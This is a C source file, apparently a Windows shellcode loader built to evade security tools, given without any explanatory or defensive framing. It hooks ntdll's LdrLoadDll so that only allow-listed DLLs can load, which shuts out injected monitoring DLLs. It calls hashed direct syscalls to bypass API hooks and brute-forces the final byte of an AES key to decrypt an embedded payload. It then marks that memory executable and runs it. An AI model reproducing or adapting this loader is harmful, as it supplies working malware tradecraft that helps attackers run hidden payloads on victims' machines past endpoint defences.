#include <stdio.h>
#include <windows.h>
#include "skunk.h"
#include "new_config.h"

#define dwAllowDllCount 5
#define dwLoaderPatchLen 6

// use _InterlockedCompareExchange64 instead of inline ASM (depends on compiler)
#define NO_INLINE_ASM

// @malwaretech atomic copy
// We need to copy 5 bytes, but we can only do 2, 4, 8 atomically
// Pad buffer to 8 bytes then use lock cmpxchg8b instruction
void SafeMemcpyPadded(LPVOID destination, LPVOID source, DWORD size)
{
	BYTE SourceBuffer[8];

	if(size > 8)
		return;

	//Pad the source buffer with bytes from destination
	memcpy(SourceBuffer, destination, 8);
	memcpy(SourceBuffer, source, size);

#ifndef NO_INLINE_ASM
	__asm 
	{
		lea esi, SourceBuffer;
		mov edi, destination;

		mov eax, [edi];
		mov edx, [edi+4];
		mov ebx, [esi];
		mov ecx, [esi+4];

		lock cmpxchg8b[edi];
	}
#else
	_InterlockedCompareExchange64((LONGLONG *)destination, *(LONGLONG *)SourceBuffer, *(LONGLONG *)destination);
#endif
}


CHAR cAllowDlls[dwAllowDllCount][MAX_PATH] = {
    "ntdll.dll",
    "kernel32.dll",
    "advapi32.dll",
    "user32.dll",
    "brax.dll"
};

LPVOID lpAddr;
// SIZE_T patchlen = sizeof(patch);
unsigned char patch[dwLoaderPatchLen] = { 0 };
CHAR OriginalBytes[dwLoaderPatchLen] = { 0 };

VOID HookLoadDll(LPVOID lpAddr);
NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress);
typedef void (WINAPI * LdrLoadDll_) (PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress);

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
{
    SYSCALL_LIST   List;
    DWORD          SsnId, allocatevirtualmemory_hash, protectvirtualmemory_hash, sz;
    INT            i;
    DWORD          dwOldProtect;
    BOOL           bAllow = FALSE;
    DWORD          dwbytesWritten;
    CHAR           cDllName[MAX_PATH];

    protectvirtualmemory_hash = 2055251111;
    GetSyscallList(&List);
    GetSSN(&List, protectvirtualmemory_hash, &SsnId);

    sprintf(cDllName, "%S", DllName->Buffer);
    for (i = 0; i < dwAllowDllCount; i++) {
        if (strcmp(cDllName, cAllowDlls[i]) == 0) {
            bAllow = TRUE;
            // printf("Allowing DLL: %s\n", cDllName);

            // unpatch
            // VirtualProtect(lpAddr, dwLoaderPatchLen, PAGE_EXECUTE_READWRITE, &dwOldProtect);
            NTSTATUS status = ZwX(SsnId, NtCurrentProcess(), &lpAddr, &sz, PAGE_EXECUTE_READWRITE, &dwOldProtect);
            if (status != STATUS_SUCCESS) {return;}
            SafeMemcpyPadded(lpAddr, OriginalBytes, dwLoaderPatchLen);
            status = ZwX(SsnId, NtCurrentProcess(), &lpAddr, &sz, dwOldProtect, &dwOldProtect);
            if (status != STATUS_SUCCESS) {return;}
            // VirtualProtect(lpAddr, dwLoaderPatchLen, dwOldProtect, &dwOldProtect);
            FlushInstructionCache(NtCurrentProcess(), lpAddr, dwLoaderPatchLen);

            // use LdrLoadDll to load allowed dll
            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary("ntdll.dll"), "LdrLoadDll");
            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);

            // repatch LdrLoadDll
            HookLoadDll(lpAddr);
        }
    }
    if (!bAllow) {
        // printf("Blocked DLL: %s\n", cDllName);
    }
    return TRUE;
}

VOID HookLoadDll(LPVOID lpAddr) {
    SYSCALL_LIST   List;
    DWORD          SsnId, allocatevirtualmemory_hash, protectvirtualmemory_hash, sz;
    DWORD          oldProtect = 0;
    void*          hLdrLoadDll = &_LdrLoadDll;
    
    protectvirtualmemory_hash = 2055251111;
    GetSyscallList(&List);
    GetSSN(&List, protectvirtualmemory_hash, &SsnId);

    // build patch: 
    // PUSH addr_of_proxy_func
    // RET
    memcpy_s(patch, dwLoaderPatchLen, "\x68", 1);
    memcpy_s(patch+1, dwLoaderPatchLen, &hLdrLoadDll, sizeof(4));
    memcpy_s(patch+5, dwLoaderPatchLen, "\xc3", 1);

    // patch
    sz = sizeof(patch);
    NTSTATUS status = ZwX(SsnId, NtCurrentProcess(), &lpAddr, &sz, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != STATUS_SUCCESS) {return;}
    // VirtualProtect(lpAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    SafeMemcpyPadded(lpAddr, patch, sizeof(patch));
    // VirtualProtect(lpAddr, sizeof(patch), oldProtect, &oldProtect);
    status = ZwX(SsnId, NtCurrentProcess(), &lpAddr, &sz, oldProtect, &oldProtect);
    if (status != STATUS_SUCCESS) {return;}

    // Clear CPU instruction cache
	FlushInstructionCache(NtCurrentProcess(), lpAddr, sizeof(patch));
    return;
}


void runner(void) {
    // get addresss of where the hook should be
    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 6);

    // set the hook
    HookLoadDll(lpAddr);

    // Testing 
    // LoadLibraryA("kernel32.dll");

    while (TRUE)
    {
        // add here: 
        SYSCALL_LIST   List;
        DWORD          SsnId, allocatevirtualmemory_hash, protectvirtualmemory_hash;
        LPVOID         desiredBase = NULL;
        ULONG          dwOldProtect = 0;
        SIZE_T         sz = ENCRYPTED_BIN_LEN; // ends up being a page (0x1000) anyway

        // hashes for ntfunctions from SuperFasthash
        allocatevirtualmemory_hash = 894705324; // [+] AllocateVirtualMemory [Length: 21] = 894705324
        protectvirtualmemory_hash = 2055251111; // [+] ProtectVirtualMemory [Length: 20] = 2055251111
        
        // bruteforce decryption key
        struct AES_ctx ctx;
        BOOL brute = TRUE;
         unsigned char* cpbuf = malloc(ENCRYPTED_BIN_LEN * sizeof(unsigned char*));
        memcpy(cpbuf, encrypted_instructions, ENCRYPTED_BIN_LEN);
        for (int i = 0x00; i<=0xff;i++) {
            key[15] = i;
            AES_init_ctx_iv(&ctx, key, iv);
            AES_CBC_decrypt_buffer(&ctx, encrypted_instructions, ENCRYPTED_BIN_LEN);
            if (SuperFastHash(encrypted_instructions, ENCRYPTED_BIN_LEN-(encrypted_instructions[sizeof(encrypted_instructions)-1])) == PAYLOAD_HASH) { 
                brute = FALSE;
                // printf("[!] Decrypted \n");
                goto POOP;
            }
            memcpy(encrypted_instructions, cpbuf, ENCRYPTED_BIN_LEN);
            
        }
        // printf("[!] sad place\n");
        return;

POOP:
        if (TRUE){}
        GetSyscallList(&List);
        GetSSN(&List, allocatevirtualmemory_hash, &SsnId);
        NTSTATUS status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, 0, (PSIZE_T)&sz, MEM_COMMIT, PAGE_READWRITE);  // as ntallocatevirtualmemory
        if (status != STATUS_SUCCESS) {return;}
        memcpy(desiredBase, encrypted_instructions, OG_PAYLOAD_LEN);
        // get syscall for ntprotectvirtualmemory
        GetSSN(&List, protectvirtualmemory_hash, &SsnId);
        status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, PAGE_EXECUTE_READWRITE, &dwOldProtect); // as ntprotectvirtualmemory
        if (status != STATUS_SUCCESS) {return;}
        ((fnAddr)desiredBase)();
        status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, dwOldProtect, &dwOldProtect);
        if (status != STATUS_SUCCESS) {return;}
    }
    return;
}


int main(void) {
    runner();
}
